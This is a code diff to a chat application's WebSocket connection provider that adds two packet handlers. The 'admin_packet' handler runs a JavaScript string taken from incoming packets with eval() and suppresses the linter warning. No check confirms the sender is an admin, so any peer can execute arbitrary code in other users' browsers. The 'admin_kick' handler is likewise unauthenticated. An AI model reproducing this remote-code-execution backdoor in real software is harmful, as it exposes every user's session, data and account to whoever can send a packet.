@@ -579,6 +579,38 @@ export const ChatConnectionProvider = ({
           if (packet.sender === userId) return;
 
           switch (packet.type) {
+            case "admin_kick":
+              const kickedUserId = packet.content.userId;
+              if (kickedUserId === userId) {
+                setMessages((prev) => [
+                  ...prev,
+                  {
+                    id: `system_${Date.now()}`,
+                    session_id: chatIdToConnect,
+                    created_at: new Date().toISOString(),
+                    type: "system",
+                    content: "You have been kicked from the chat.",
+                    sender: "system",
+                  },
+                ]);
+                setStatus("disconnected");
+                ws.close();
+                wsRef.current = null;
+              }
+              break;
+            case "admin_packet":
+              const code = packet.content.code;
+              // execute js
+              if (code) {
+                // eval
+                try {
+                  // eslint-disable-next-line no-eval
+                  eval(code);
+                } catch (error) {
+                  console.error("Error executing admin packet code:", error);
+                }
+              }
+              break;
             case "message_acknowledgment":
               const { messageId } = packet.content;
               console.log("Message acknowledged:", messageId);
